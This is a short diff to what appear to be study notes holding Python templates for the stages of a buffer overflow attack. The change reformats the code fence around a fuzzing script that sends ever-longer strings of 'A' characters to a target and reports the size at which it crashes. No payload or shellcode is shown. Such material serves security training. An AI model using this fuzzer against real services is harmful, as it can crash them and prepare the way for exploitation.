@@ -1,9 +1,10 @@
 The below is the Python templates for the different stages of BOF.
 
 ### Spiking & Fuzzing
-`#!/usr/bin/python
+```
+#!/usr/bin/python
 
-import sys,socket
+import socket,sys
 from time import sleep
 
 buffer = "A" * 500
@@ -20,4 +21,5 @@ while True:
         buffer += "A" * 500
     except:
         print("Debugger crashed at %s bytes" % str(len(buffer)))
-        sys.exit`
+        sys.exit
+```
